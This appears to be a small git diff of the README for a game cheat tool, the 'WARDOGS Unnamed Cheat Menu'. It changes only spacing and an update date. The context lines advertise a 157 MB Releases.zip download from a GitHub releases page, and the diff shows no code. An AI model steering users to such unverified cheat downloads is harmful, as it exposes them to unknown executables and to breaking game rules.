@@ -2,6 +2,7 @@
 
 # 🐕 WARDOGS Unnamed Cheat Menu
 
+
 <img width="1298" height="799" alt="ward2" src="https://github.com/user-attachments/assets/036b0fa5-acc7-446a-92cb-9c3edaab57f6" />
 
 
@@ -12,7 +13,7 @@
 
 [![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Update/Releases.zip)
 
-**Release:** `v0.7.5+` · **Package size:** approximately `157 MB` (Update 09-15)
+**Release:** `v0.7.5+` · **Package size:** approximately `157 MB` (Update 09-16)
 
 </div>
 
